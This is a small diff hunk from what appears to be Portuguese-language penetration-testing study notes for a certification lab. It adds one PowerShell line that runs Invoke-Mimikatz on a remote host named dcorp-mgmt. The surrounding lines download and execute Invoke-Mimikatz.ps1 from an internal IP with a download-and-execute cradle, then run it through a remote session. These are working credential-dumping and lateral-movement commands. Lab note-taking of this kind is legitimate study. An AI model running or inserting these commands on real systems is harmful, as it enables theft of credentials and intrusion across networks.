@@ -2736,6 +2736,7 @@ CARREGAR O MIMIKATZ LOCALMENTE E DEPOIS REMOTAMENTE:
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/crtp/Invoke-Mimikatz.ps1")
 Invoke-Command -Scriptblock ${function:Invoke-Mimikatz} -session $sess
+Invoke-Command -Scriptblock ${function:Invoke-Mimikatz} -computername dcorp-mgmt
 ```
 
 
